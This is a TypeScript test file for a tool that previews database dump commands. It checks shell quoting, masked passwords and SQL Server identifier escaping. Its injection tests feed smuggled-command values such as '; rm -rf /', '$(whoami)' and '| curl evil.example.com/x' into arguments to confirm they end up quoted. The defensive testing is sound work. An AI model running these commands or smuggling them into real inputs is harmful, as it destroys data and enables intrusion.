import { describe, expect, it } from 'vitest'
import {
  buildDumpCommandPreview,
  shellQuote,
  type DumpCommandPreviewInput,
} from './dumpCommand'

function baseInput(
  overrides: Partial<DumpCommandPreviewInput> = {}
): DumpCommandPreviewInput {
  return {
    dbEngine: 'postgres',
    deploymentMode: 'docker',
    containerName: 'pg-container',
    dbUser: 'app_user',
    dbName: 'app_db',
    hasPassword: false,
    pgDumpExtraArgs: '',
    mysqlDumpExtraArgs: '',
    sqlCmdExtraArgs: '',
    ...overrides,
  }
}

describe('shellQuote', () => {
  it('quotes an empty string', () => {
    expect(shellQuote('')).toBe("''")
  })

  it('leaves alphanumeric/dash/underscore/dot tokens bare', () => {
    expect(shellQuote('app_db-01.prod')).toBe('app_db-01.prod')
  })

  it('quotes and escapes tokens with special characters', () => {
    expect(shellQuote("a'b")).toBe("'a'\\''b'")
  })

  it('neutralizes shell metacharacters by quoting', () => {
    expect(shellQuote('; rm -rf /')).toBe("'; rm -rf /'")
  })
})

describe('buildDumpCommandPreview — postgres', () => {
  it('docker mode, no password: matches the pre-existing command shape', () => {
    const preview = buildDumpCommandPreview(baseInput())
    expect(preview.lines).toEqual([
      'docker exec pg-container pg_dump -U app_user -Fc app_db',
    ])
  })

  it('host mode, no password: no docker prefix', () => {
    const preview = buildDumpCommandPreview(
      baseInput({ deploymentMode: 'host' })
    )
    expect(preview.lines).toEqual(['pg_dump -U app_user -Fc app_db'])
  })

  it('docker mode with password: masked, never the real value', () => {
    const preview = buildDumpCommandPreview(baseInput({ hasPassword: true }))
    expect(preview.lines[0]).toContain("-e 'PGPASSWORD=***'")
    expect(preview.lines[0]).not.toContain('hunter2')
  })

  it('includes extra args', () => {
    const preview = buildDumpCommandPreview(
      baseInput({ pgDumpExtraArgs: '--no-owner --compress=9' })
    )
    expect(preview.lines[0]).toContain('--no-owner')
    expect(preview.lines[0]).toContain('--compress=9')
  })
})

describe('buildDumpCommandPreview — mysql', () => {
  it('docker mode always shows the MYSQL_PWD assignment', () => {
    const preview = buildDumpCommandPreview(
      baseInput({
        dbEngine: 'mysql',
        containerName: 'mysql-container',
        hasPassword: true,
      })
    )
    expect(preview.lines).toEqual([
      "docker exec -e 'MYSQL_PWD=***' mysql-container mysqldump -u app_user app_db",
    ])
  })

  it('host mode', () => {
    const preview = buildDumpCommandPreview(
      baseInput({
        dbEngine: 'mysql',
        deploymentMode: 'host',
        hasPassword: true,
      })
    )
    // "***" contains a non-alphanumeric-dash character ('*'), so ShellQuote
    // wraps the value half of the assignment in quotes — same rule as any
    // other special-character value.
    expect(preview.lines).toEqual([
      "MYSQL_PWD='***' mysqldump -u app_user app_db",
    ])
  })
})

describe('buildDumpCommandPreview — sqlserver', () => {
  it('produces three lines: backup, read, cleanup', () => {
    const preview = buildDumpCommandPreview(
      baseInput({
        dbEngine: 'sqlserver',
        containerName: 'mssql-container',
        hasPassword: true,
      })
    )
    expect(preview.lines).toHaveLength(3)
    expect(preview.lines[0]).toContain('BACKUP DATABASE')
    expect(preview.lines[0]).toContain('[app_db]')
    expect(preview.lines[0]).toContain("-e 'SQLCMDPASSWORD=***'")
    expect(preview.lines[1]).toContain('cat ')
    expect(preview.lines[2]).toContain('rm -f ')
  })

  it('host mode has no docker prefix on any line', () => {
    const preview = buildDumpCommandPreview(
      baseInput({
        dbEngine: 'sqlserver',
        deploymentMode: 'host',
        hasPassword: true,
      })
    )
    for (const line of preview.lines) {
      expect(line).not.toContain('docker')
    }
  })

  it('escapes a literal ] in dbName as ]] inside the bracket identifier, mirroring sqlServerBracketIdentifier', () => {
    const preview = buildDumpCommandPreview(
      baseInput({
        dbEngine: 'sqlserver',
        deploymentMode: 'host',
        dbName: 'db]name',
        hasPassword: true,
      })
    )
    expect(preview.lines[0]).toContain('[db]]name]')
  })
})

/**
 * Walks s tracking whether we are inside a single-quoted region (POSIX
 * single quotes, recognizing ShellQuote's own "'\''" idiom for an embedded
 * literal quote as staying logically inside the quoted argument on both
 * sides). Returns an error message if any of ';', '|', '&', '`', "$(" is
 * found while not inside single quotes. Mirrors the equivalent Go test
 * helper in backend/internal/scheduler/dumpcommand_test.go.
 */
function findUnquotedShellMetachar(s: string): string | null {
  let inQuotes = false
  for (let i = 0; i < s.length; i++) {
    if (
      s[i] === "'" &&
      s[i + 1] === '\\' &&
      s[i + 2] === "'" &&
      s[i + 3] === "'"
    ) {
      i += 3
      continue
    }
    const ch = s[i]
    if (ch === "'") {
      inQuotes = !inQuotes
    } else if (
      !inQuotes &&
      (ch === ';' || ch === '|' || ch === '&' || ch === '`')
    ) {
      return `unquoted metacharacter '${ch}'`
    } else if (!inQuotes && ch === '$' && s[i + 1] === '(') {
      return "unquoted '$(' command substitution"
    } else if (!inQuotes && ch === '\n') {
      return 'unquoted newline'
    }
  }
  return null
}

describe('buildDumpCommandPreview — shell injection is neutralized', () => {
  const dangerousInputs = [
    '; touch /tmp/pwned #',
    '| curl evil.example.com/x',
    '&& rm -rf / &',
    '`whoami`',
    '$(whoami)',
    "'; rm -rf / #", // contains a literal single quote
  ]

  for (const dangerous of dangerousInputs) {
    it(`extraArgs containing ${JSON.stringify(dangerous)} produce no unquoted metacharacter`, () => {
      const preview = buildDumpCommandPreview(
        baseInput({ pgDumpExtraArgs: dangerous })
      )
      const found = findUnquotedShellMetachar(preview.lines[0])
      expect(found).toBeNull()
    })
  }

  it('a dbName containing shell metacharacters and a single quote is safely escaped', () => {
    const preview = buildDumpCommandPreview(
      baseInput({ dbName: "db'; rm -rf / #" })
    )
    expect(findUnquotedShellMetachar(preview.lines[0])).toBeNull()
  })

  it('a masked password never introduces an unquoted metacharacter', () => {
    const preview = buildDumpCommandPreview(
      baseInput({ dbEngine: 'mysql', hasPassword: true })
    )
    expect(findUnquotedShellMetachar(preview.lines[0])).toBeNull()
  })
})

describe('buildDumpCommandPreview — password never appears in plaintext', () => {
  it('does not leak a real password value into the preview', () => {
    const preview = buildDumpCommandPreview(
      baseInput({ dbEngine: 'mysql', hasPassword: true })
    )
    // The component must never pass the real password into this module —
    // this test documents the contract: only hasPassword (boolean) crosses
    // the boundary, so there is no real value that could leak here.
    expect(preview.lines.join('\n')).not.toMatch(/hasPassword/)
    expect(preview.lines.join('\n')).toContain('***')
  })
})
